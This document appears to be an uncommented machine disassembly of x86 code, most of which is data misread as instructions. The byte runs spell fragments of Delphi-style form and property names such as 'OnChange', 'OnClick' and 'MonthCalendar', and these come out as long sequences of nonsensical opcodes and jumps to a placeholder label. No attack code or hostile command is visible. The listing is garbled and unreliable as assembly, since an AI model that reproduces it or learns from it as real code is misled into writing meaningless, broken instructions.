je r-xdata
fild [ ebx ]
add [ eax ] cl
dec edi
outsb
arpl [ ebp + 0x64 ] sp
inc ebx
outsb
inc ecx
jbe r-xdata
add [ ecx ] 0x18
add [ eax - 0x5700fffe ] ch
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f140040 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] al
add [ ecx ] cl
push esi
imul esp [ ebp + 0x77 ] 0x6c797453
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0044 ] al
outsb
inc ebx
push 0x69676e61
outsb
je r-xdata
popad
outsb
arpl [ ebp + 0x64 ] sp
inc ebx
jne r-xdata
or [ esi + 0x69 ] edx
ja r-xdata
dec ecx
insd
popad
jae r-xdata
add [ eax ] al
insd
inc esp
jb r-xdata
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
rol [ edx ] 0x1
add bh bh
rol [ edx ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esi
add [ 0x6f436e4f ] cl
insb
jne r-xdata
je r-xdata
outsb
inc ebx
push 0x65676e61
sbb al 0xdf
inc ebx
add al al
add al [ eax ]
je r-xdata
popad
je r-xdata
add bh bh
push 0x1004471
add [ eax ] al
add [ eax ] al
adc [ ecx ] ch
inc esi
add [ edx + eax ] bl
pop es
inc ebp
add [ eax * 8 - 0x3a63ffbb ] bl
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add al cl
add al [ eax ]
dec eax
add al [ eax ]
ja r-xdata
add [ eax ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edi
add [ edi ] cl
dec edi
outsb
inc ebx
outsd
insb
jne r-xdata
dec edi
insd
inc esp
jb r-xdata
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080043 ] al
fiadd [ ebx ]
rol [ edx ] 0x0
insd
inc esp
jb r-xdata
jecxz r-xdata
dec eax
jecxz r-xdata
jne r-xdata
add [ gs : eax ] dl
inc eax
add [ edi ] dl
add bh bh
insb
pop ecx
inc ebp
add al cl
jpe r-xdata
insb
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f10004c ] al
jb r-xdata
add [ eax ] al
add [ eax + 0x4f0e004a ] al
outsb
inc esp
jb r-xdata
outsb
add [ eax ] al
add [ eax ] 0x0
ja r-xdata
popad
ja r-xdata
add [ eax ] 0x0
add [ eax + 0x4f1b0042 ] al
outsb
inc ecx
jbe r-xdata
inc [ ecx ]
insd
js r-xdata
add [ edx ] cl
je r-xdata
outsb
inc ebx
jne r-xdata
add [ eax ] al
or [ eax + eax + 0x10 ] 0x4f
outsb
inc ebx
outsd
outsb
je r-xdata
cwde
adc [ ebp ] al
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ebp
add [ ebx ] dl
js r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edx
add [ esi ] cl
dec edi
fcomp st7
inc ebx
add al ah
add al [ eax ]
jmp eax
add [ eax ] eax
jmp [ eax ]
jne r-xdata
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
call sub_443a25
outsb
arpl [ ebp + 0x64 ] sp
inc ebx
jne r-xdata
dec edi
add [ eax ] bl
inc ebx
add [ eax - 0x4700fffe ] bh
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push edx
add [ edx ] cl
dec edi
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
sub [ ebx ] al
add bh bh
sub [ ebx ] al
add bh bh
inc esi
imul ebp [ esi + 0x64 ] r-xdata
sbb [ ebx ] al
add bh bh
sbb [ ebx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
or [ edi ] 0xa
insd
inc esp
jb r-xdata
je r-xdata
je r-xdata
inc ebx
jne r-xdata
push eax
outsd
jo r-xdata
add [ eax + 0x4f070045 ] al
dec ecx
je r-xdata
imul esi [ ecx + ebp * 2 + 0x6e ] 0x450c0467
outsd
outsb
push eax
loope r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ebx
add [ edx ] cl
dec edi
outsb
inc esp
insb
je r-xdata
dec eax
imul ebp [ esi + 0x74 ] r-xdata
and [ ebx ] al
add bh bh
and [ ebx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ecx
add [ ecx ] dl
outsb
inc esp
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a004f ] al
ja r-xdata
inc esp
insd
inc esp
jb r-xdata
jo r-xdata
insd
inc edi
je r-xdata
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090057 ] al
sbb al 0xde
inc ebx
add [ eax + 0x3 ] al
add bh bh
inc eax
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090056 ] al
outsb
inc ebp
imul esi [ fs : ecx + ebp * 2 + 0x6e ] 0x450c0467
add [ eax ] dh
outsb
inc esp
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push esp
add [ edx ] cl
dec edi
push ebx
je r-xdata
dec esi
add [ esi ] al
dec edi
je r-xdata
outsb
add [ eax ] 0x0
add [ eax + 0x4f0a0050 ] al
ja r-xdata
add [ eax - 0x80000000 ] al
dec ecx
add [ ecx ] cl
dec edi
outsb
inc ebx
outsd
insd
jo r-xdata
loope r-xdata
add [ eax ] al
insd
popad
dec ecx
outsb
js r-xdata
outsb
add [ eax ] al
adc [ edi ] 0x9
dec edi
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0054 ] al
je r-xdata
dec edi
outsb
inc esp
popad
je r-xdata
adc [ ecx ] 0x11
jl r-xdata
add [ eax ] al
insd
[ eax ]
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne r-xdata
jae r-xdata
add al dh
add al [ eax ]
push eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c004b ] al
outsb
inc ebx
jne r-xdata
add [ eax ] 0x0
add [ eax + 0x4f080060 ] al
outsb
dec ecx
outsb
jae r-xdata
inc esp
jb r-xdata
add [ eax ] al
out 0x43 eax
add [ eax + 0x3 ] dl
add bh bh
push eax
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f11005c ] al
outsb
inc edi
je r-xdata
add al 0xc
inc ebp
je r-xdata
add [ eax ] al
adc [ eax + eax + 0xa ] 0x4f
inc ebx
push 0x65676e61
or [ ebx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ebx
add [ eax ] dl
add eax [ eax ]
call [ eax ]
add eax [ eax ]
inc [ ecx ]
outsb
add [ eax ] al
add eax [ eax ]
inc [ eax ]
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f13004d ] al
push eax
add [ edx ] cl
dec edi
dec ecx
je r-xdata
outsd
outsb
inc esp
popad
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f06004e ] al
je r-xdata
pop es
dec edi
jb r-xdata
inc ebp
add al bl
add [ eax ] eax
jo r-xdata
add [ eax ] al
and [ ecx ] 0x9
dec edi
jbe r-xdata
jb r-xdata
jne r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x4 ] bp
or al 0x45
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090058 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
insd
je r-xdata
popad
insd
cmp ch ah
inc ebx
add [ eax ] cl
add eax [ eax ]
add [ eax ] al
insd
inc esp
jb r-xdata
loopne r-xdata
jo r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0064 ] al
dec edi
outsb
dec esp
or al [ ebp ]
fadd [ ecx ]
add bh bh
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
popad
add [ ecx ] cl
add [ eax + 0x4f0a005d ] al
outsb
inc esp
jb r-xdata
insd
dec ecx
insd
popad
pop esp
or eax [ ebp ]
call 0xffffffffe942f83f
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a005e ] al
outsb
inc esp
jb r-xdata
or al [ ebp ]
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
dec ebx
jns r-xdata
jb r-xdata
outsd
out 0x43 eax
add [ eax + 0x3 ] bl
add bh bh
pop eax
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09005f ] al
dec ecx
je r-xdata
add eax [ eax ]
push [ eax ]
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
inc ebx
add [ eax ] bh
add eax [ eax ]
dec [ eax ]
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
ja r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ecx ] cl
pop edi
inc ecx
add al bh
add [ eax ] al
outsb
dec ebp
outsd
jne r-xdata
or [ ebp ] eax
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ fs : ebx ] cl
dec edi
loopne r-xdata
inc esp
outsd
ja r-xdata
or [ ebp ] eax
cwde
or al [ ebp ]
loopne r-xdata
outsb
dec ecx
outsb
outsw
push esp
imul esi [ eax - 0x24 ] 0x600043dd
add eax [ eax ]
jmp [ eax + 0x3 ]
add [ eax ] al
sbb [ edi ] 0x9
dec edi
lodsb [ esi ]
loop r-xdata
insd
loop r-xdata
mov esp 0x1000450b
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b006a ] al
outsb
push ebp
jo r-xdata
popad
add [ eax + 0x3 ] ch
add bh bh
push 0x1ff0003
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0068 ] al
outsb
push ebx
call 0xffffffffd8443e66
add [ eax ] al
les ecx [ 0x1000045 ]
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
imul eax [ eax ] 0x536e4f0b
je r-xdata
dec ebp
outsd
jbe r-xdata
jmp eax
add bh bh
loopne r-xdata
dec edi
add al bh
add al [ eax ]
add [ edx + ecx * 2 + 0x45 ] bl
jb r-xdata
dec edi
add [ eax ] al
and [ esi ] 0x9
add [ eax ] al
sbb eax [ edx ]
xchg esp eax
sbb eax [ edx ]
call 0xffffffff9c443cc0
dec eax
inc ebp
add al ah
push ds
inc edx
add [ eax - 0x80 ] al
inc ebp
add [ ebx + ebx + 0x42 ] bh
add [ eax - 0x57ffbab7 ] dh
mov ebx 0x4a5c0043
inc ebp
push ebx
je r-xdata
inc esp
outsd
arpl [ ebx - 0x44 ] bp
or eax [ ebp ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push 0x0
or ecx [ edi + 0x6e ]
xor al 0x40
jb r-xdata
insb
arpl [ gs : ecx + ecx * 2 + 0x74 ] si
insd
jo r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0062 ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
bound eax [ eax ]
or cl [ edi + 0x6e ]
add [ eax ] al
add [ ebx + edi * 8 + 0x43 ] bh
add [ eax + eax ] cl
add [ eax ] al
sub [ edx + 0x40 ] dh
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
adc al 0x45
inc ebx
outsd
insd
insd
outsd
outsb
inc ebx
popad
insb
outsb
popad
jb r-xdata
inc ebx
loopne r-xdata
inc esp
jb r-xdata
outsb
dec ebp
outsd
jne r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090066 ] al
inc ebp
add al ah
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ gs : ebx ] cl
jb r-xdata
inc eax
add [ ecx + esi + 0x31a00040 ] al
jb r-xdata
jl r-xdata
inc esi
add [ eax ] dl
dec ecx
inc ebp
add [ eax ] cl
pop ds
inc esi
add [ eax + eax * 4 + 0x45 ] ah
add [ eax + 0x4400454a ] cl
dec ecx
inc ebp
add [ eax + 0x1f ] bl
inc esi
add [ edi + ebx + 0x46 ] ch
add [ ecx + ecx * 2 + 0x45 ] bh
add [ ebx ] bl
inc edx
add [ ebx + ebx + 0x1be80042 ] dl
inc edx
add [ eax + ecx * 2 + 0x1ee00045 ] bl
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x1b ] cl
test dl bh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 8 ] bl
inc ebx
add [ eax ] ch
add [ eax ] al
add [ esi + ebp * 4 ] ch
inc ebx
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
dec edi
outsb
dec ebp
outsd
jne r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] cl
add [ eax ] al
inc [ ecx ]
add [ ecx ] cl
push esp
js r-xdata
inc ebx
popad
insb
inc ebx
outsd
insb
outsd
jb r-xdata
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
outsd
jb r-xdata
inc esp
add [ ebx ] dl
push esp
dec esp
add [ eax + ebp * 4 - 0x57dbffbc ] bl
add [ edi + ebx + 0x49d80046 ] dl
inc ebp
add [ edi + ebx + 0x49f80046 ] bl
inc ebp
add [ edi + ebx - 0x7f93ffba ] ah
inc ebp
add ah ch
dec edx
inc ebp
add [ ebx + ecx * 2 ] ch
inc ebp
add [ eax ] bl
dec edx
inc ebp
add [ eax - 0x43ffb9e1 ] bh
pop ds
inc esi
add [ edx + ecx * 2 ] bh
inc ebp
add [ edi + eax * 2 - 0x4497ffbb ] ch
inc ebx
add ah ch
mov ebx 0xbb7c0043
inc ebx
add ah dl
test al 0x44
add al ah
mov ebp 0xa89c0043
inc esp
add [ eax + ebp * 4 ] ah
inc ebp
add [ eax ] al
jmp eax
dec esp
or al [ ebp ]
call 0xffffffffe942f91a
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070063 ] al
outsb
je r-xdata
inc ebx
outsd
insb
outsd
jb r-xdata
sub [ edx ] eax
adc [ eax ] al
add bh bh
jo r-xdata
add ah bh
inc edx
add [ eax ] dl
add [ eax ] al
push [ eax - 0x7a ]
inc ebx
popad
insb
inc ebx
imul esi [ ebx + 0x74 ] 0x77656956
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
inc eax
add al ah
sti
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
sti
jae r-xdata
inc edx
popad
arpl [ ebx + 0x43 ] bp
outsd
insb
outsd
jb r-xdata
outsd
insb
push 0x436c6143
inc ebx
add [ edi ] al
inc esp
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0xff0000 ] al
add [ ecx ] cl
inc edx
popad
arpl [ ebx + 0x43 ] bp
outsd
insb
outsd
jb r-xdata
sub [ edx ] eax
adc al 0x0
add bh bh
jo r-xdata
push esp
imul esi [ esp + ebp * 2 + 0x65 ] 0x6b636142
inc ebx
outsd
add bh bh
add al [ eax ]
push cs
loopne r-xdata
je r-xdata
popad
jns r-xdata
add al [ eax ]
sub [ edx ] eax
sbb al 0x0
add bh bh
jo r-xdata
add ah al
xchg esp eax
inc ecx
add [ ebp + eax * 4 + 0x44 ] ah
add [ edi ] cl
push esp
dec ebp
outsd
outsb
je r-xdata
sub [ edx ] eax
or al 0x0
add bh bh
jo r-xdata
sub [ edx ] eax
or [ eax ] al
add bh bh
jo r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add bh bh
outsd
jb r-xdata
inc ebx
add al bh
inc cx
add [ esi ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
dec ecx
outsb
or esp [ edi + ebp * 2 + 0x77 ]
push esp
outsd
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
inc [ edx ]
add [ esi ] cl
inc esp
add [ ecx ] al
add [ eax ] al
add [ 0x13000000 ] al
add [ eax ] al
inc [ 0x72541100 ]
popad
imul ebp [ ecx + ebp * 2 + 0x6e ] 0x78655467
je r-xdata
inc eax
add [ ebx + edx * 4 - 0x6b43ffbf ] ch
inc ecx
inc esp
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
inc ebx
add [ eax ] ah
add [ eax ] al
add [ esi + 0x34340041 ] al
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
insb
outsd
jb r-xdata
insb
jae r-xdata
fdivr [ ebp + eax * 2 ]
add al 0x7d
inc ebp
add [ eax + ebx * 2 ] bl
add [ edi + ecx * 2 ] bl
inc ebp
add [ ebx + eax * 4 ] bh
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ edi + eax * 4 + 0x44 ] al
add [ eax - 0x37 ] ch
inc ebp
add [ esi + ecx * 8 - 0x322fffbb ] al
inc ebp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
dec eax
les eax [ ebp ]
sub cl al
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edi * 8 ] dh
outsb
je r-xdata
or esp [ edi + ebp * 2 + 0x77 ]
push ebx
outsd
ja r-xdata
inc edi
je r-xdata
outsb
jae r-xdata
outsb
outsd
insb
outsd
jb r-xdata
add [ eax ] al
push [ eax - 0x7a ]
add [ eax + 0x8004229 ] bl
rcl [ ebp + eax * 2 + 0x44892800 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ edi + edx * 4 ] bh
inc ebp
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ eax ] dl
mov [ eax + eax + 0x14 ] al
mov [ eax + eax + 0x20 ] al
sub al [ eax ]
les ecx [ ecx + 0x2a200044 ]
inc eax
add [ eax ] ah
sub al [ eax ]
and [ edx ] ch
inc eax
add [ edi ] cl
push esp
inc ebx
outsd
insd
insd
outsd
outsb
inc ebx
popad
insb
outsb
popad
jb r-xdata
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add [ ebp + ebx * 4 + 0x45 ] bl
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
add [ edi * 2 + 0x581c0045 ] al
add ecx [ eax ]
push es
popad
jb r-xdata
jb r-xdata
inc ebx
add [ eax + 0x2 ] dl
add [ eax ] al
fcom [ edi ]
inc ebp
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
adc [ eax ] al
xchg esp eax
adc [ eax ] al
lea eax [ eax ]
push eax
inc [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
push ebx
outsb
jb r-xdata
or [ esi ] al
popad
jns r-xdata
add [ eax ] eax
add [ eax ] al
add eax [ eax ]
add [ eax ] al
inc eax
add [ edi * 8 + 0xd030043 ] bl
push esp
inc ebx
popad
insb
inc esp
popad
jns r-xdata
add [ eax ] al
add [ edi + edi * 8 + 0xc0043 ] bh
add [ eax ] al
xor bl bh
inc ebx
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc [ ebx ]
pop es
andps xmm0 [ ebx + 0x6f ]
insd
insd
outsd
outsb
inc ebx
popad
insb
outsb
popad
jb r-xdata
add [ 0x746e6f4d ] al
push 0x72614308
push esp
dec edi
bound ebp [ edx + 0x65 ]
inc ecx
add [ eax ] cl
jpo r-xdata
mov [ esi - 0x6c27ffbb ] dl
imul ebp [ esi + 0x61 ] 0x1174006c
inc eax
outsd
outsb
je r-xdata
dec ebp
popad
jns r-xdata
jb r-xdata
popad
jns r-xdata
or [ edi + ebp * 2 + 0x77 ] esp
inc esi
outsd
ja r-xdata
popad
je r-xdata
push di
imul eax [ gs : ecx ] 0x0
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax ] bl
std
inc ebx
add [ ecx ] cl
outsd
ja r-xdata
add [ ebx + eax * 4 ] bh
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
inc ebx
popad
insb
inc ebp
jb r-xdata
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
push cs
inc ebp
dec ebp
outsd
outsb
je r-xdata
inc [ ebx ]
mov [ ebx ] ds
inc ebp
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
add al ah
xchg [ eax + eax + 0x54 ] eax
into
inc ebp
add [ eax - 0x27ffba6a ] cl
xchg ebx eax
jb r-xdata
inc edx
outsd
insb
dec ecx
outsb
outsw
or [ ebx + 0x61 ] al
add al al
sahf
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x34 ] cl
inc eax
or [ ebx + 0x61 ] al
adc [ edi + ebp * 2 + 0x77 ] ah
outsd
ja r-xdata
xor al 0x40
dec eax
imul ebp [ esi + 0x61 ] 0x4d0d016c
or [ edi + ebp * 2 + 0x77 ] esp
push ebx
outsd
ja r-xdata
outsw
inc ebp
jbe r-xdata
push 0x64737275
popad
jns r-xdata
dec esp
outsd
outsb
popad
jns r-xdata
rcl [ ebp + eax * 2 + 0x44892800 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ edi + edx * 4 ] bh
add [ edi * 2 + 0x581c0045 ] al
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ eax + 0x68004491 ] ch
leave
inc ebp
add [ esp + edx * 4 - 0x6cc7ffbc ] bl
inc esp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
dec eax
les eax [ ebp ]
sub cl al
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
outsd
jb r-xdata
and [ ecx ] al
inc esp
add [ eax ] al
insb
jae r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] cl
inc ebx
add [ eax ] al
inc eax
add [ eax - 0x2 ] dl
je r-xdata
inc ebx
popad
jne r-xdata
add [ eax + edx + 0x10940040 ] dl
inc eax
add [ ebp - 0x1afffc0 ] cl
outsb
popad
insb
add [ ecx + edx + 0x40 ] dh
popad
jns r-xdata
arpl [ eax + eax + 0x5 ] si
dec ebp
outsd
outsb
je r-xdata
push 0x65
ja r-xdata
or al 0x64
outsd
outsd
add eax [ eax ]
inc ebx
popad
insb
outsb
popad
jb r-xdata
insd
inc ebx
je r-xdata
add [ ebx + ebx + 0xb0045 ] cl
or [ ebx + 0x6f ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
add [ eax + eax + 0xa ] al
add [ eax + eax + 0x50 ] eax
add al [ eax ]
add [ esi + edi * 8 ] al
inc ebx
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
xor al 0x40
add al al
sahf
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
add al ah
xchg [ eax + eax + 0x54 ] eax
into
inc ebp
add [ eax - 0x27ffba6a ] cl
xchg ebx eax
inc ecx
add [ eax ] cl
jpo r-xdata
sbb [ eax ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
add [ eax + eax ] eax
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add [ ebp + ebx * 4 + 0x45 ] bl
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
fdivr [ ebp + eax * 2 ]
add al 0x7d
inc ebp
add [ eax + ebx * 2 ] bl
add [ edi + ecx * 2 ] bl
inc ebp
add [ ebx + 0x43ffbcc0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
inc ebx
outsd
insd
or [ ebx + 0x6f ] al
outsd
ja r-xdata
inc ebx
je r-xdata
jne r-xdata
jmp [ edx + ecx * 4 + 0x44 ]
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc ebp
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ eax ] dl
mov [ eax + eax + 0x14 ] al
mov [ eax + eax - 0x14 ] al
xchg ebx eax
inc esp
add ah al
mov [ eax + eax - 0xc ] eax
xchg ebx eax
inc esp
add [ eax ] ch
xchg esp eax
inc esp
add [ esp + edx * 4 + 0x44 ] ah
add [ edx ] al
add [ esi ] cl
mov al 0x4e
mov esp sub_449200
sub [ edx + 0x540e0044 ] dl
dec ebp
outsd
outsb
je r-xdata
add [ eax - 0x76 ] cl
inc ebp
add al ch
xchg edi eax
inc ebp
add [ eax - 0x2fffbb6d ] ah
xchg esp eax
inc ebp
add [ eax ] ch
mov [ eax + eax - 0x80 ] eax
cwde
inc ebp
add [ eax + ebx * 4 - 0x68c3ffbb ] al
inc eax
